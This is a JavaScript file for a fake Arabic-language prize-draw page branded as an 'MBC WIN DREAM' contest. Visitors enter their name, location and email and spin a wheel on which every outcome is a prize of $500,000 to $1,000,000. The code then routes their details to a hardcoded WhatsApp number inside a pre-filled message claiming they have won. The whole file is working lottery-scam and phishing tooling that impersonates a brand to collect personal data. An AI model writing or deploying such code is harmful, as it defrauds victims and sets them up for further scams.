// --- 0. CRITICAL SETUP VARIABLES ---
const YOUR_WHATSAPP_NUMBER = "+13215054515"; 
const WHATSAPP_MESSAGE =
    "مرحباً! لقد فزت بجائزة في سحب MBC WIN DREAM. هذه بياناتي لاستلام الجائزة:"; 

// --- PRIZE TIERS (MONEY ONLY) ---
const prizes = [
    {
        name: "مبلغ 500,000 دولار + ثلاجة + جهاز PlayStation 5",
        amount: 500000
    },
    {
        name: "مبلغ 800,000 دولار + سيارة + تلفاز",
        amount: 800000
    },
    {
        name: "مبلغ 1000,000 دولار نقداً",
        amount: 1000000
    }
];

// --- 1. GET ALL REQUIRED ELEMENTS ---
const dreamButtons = document.querySelectorAll('.dream-btn');
const detailsForm = document.getElementById('details-form');
const spinBtn = document.getElementById('spin-btn');

const step1Welcome = document.getElementById('step-1-welcome');
const step2Form = document.getElementById('step-2-form');
const step3Spin = document.getElementById('step-3-spin');
const step4Reward = document.getElementById('step-4-reward');

const resultMessage = document.getElementById('result-message');
const prizeWonElement = document.getElementById('prize-won');
const whatsappLink = document.getElementById('whatsapp-link');

// --- GLOBAL VARIABLES ---
let userData = {};
let winningPrize = null;
let selectedDream = "";


// --- 2. STEP 1: DREAM SELECTION ---
function startChallenge(event) {
    selectedDream = event.currentTarget.getAttribute("data-dream");

    step1Welcome.style.display = "none";
    step2Form.style.display = "block";
}

dreamButtons.forEach(button => {
    button.addEventListener("click", startChallenge);
});


// --- 3. STEP 2: FORM SUBMISSION ---
function handleFormSubmit(event) {
    event.preventDefault();

    userData.name = document.getElementById("name").value.trim();
    userData.location = document.getElementById("location").value.trim();
    userData.email = document.getElementById("email").value.trim();

    if (!userData.name || !userData.location || !userData.email) {
        alert("يرجى إدخال جميع البيانات قبل المتابعة.");
        return;
    }

    step2Form.style.display = "none";
    step3Spin.style.display = "block";
    resultMessage.textContent = 'اضغط على زر «دوّر الآن» عندما تكون جاهزاً.';
}

detailsForm.addEventListener("submit", handleFormSubmit);


// --- 4. STEP 3: SPIN LOGIC ---
function spinWheel() {
    spinBtn.disabled = true;
    spinBtn.textContent = "...جاري التدوير...";
    resultMessage.textContent = "يتم الآن تحديد جائزتك، يرجى الانتظار...";

    setTimeout(() => {
        const randomIndex = Math.floor(Math.random() * prizes.length);
        winningPrize = prizes[randomIndex];

        resultMessage.textContent =
            `تهانينا! لقد ربحت ${winningPrize.name}.`;

        setTimeout(() => {
            handleRewardTransition();
        }, 1500);

    }, 3000);
}

spinBtn.addEventListener("click", spinWheel);


// --- 5. STEP 4: SHOW REWARD + WHATSAPP ---
function handleRewardTransition() {
    step3Spin.style.display = "none";
    step4Reward.style.display = "block";

    prizeWonElement.textContent = `🎉 ${winningPrize.name}`;

    const whatsappText =
        `${WHATSAPP_MESSAGE}\n\n` +
        `الجائزة: ${winningPrize.name}\n` +
        `الحلم المختار: ${selectedDream}\n` +
        `الاسم: ${userData.name}\n` +
        `الموقع: ${userData.location}\n` +
        `البريد الإلكتروني: ${userData.email}`;

    const encodedMessage = encodeURIComponent(whatsappText);
    const finalWhatsAppURL =
        `https://wa.me/${YOUR_WHATSAPP_NUMBER}?text=${encodedMessage}`;

    whatsappLink.href = finalWhatsAppURL;
}
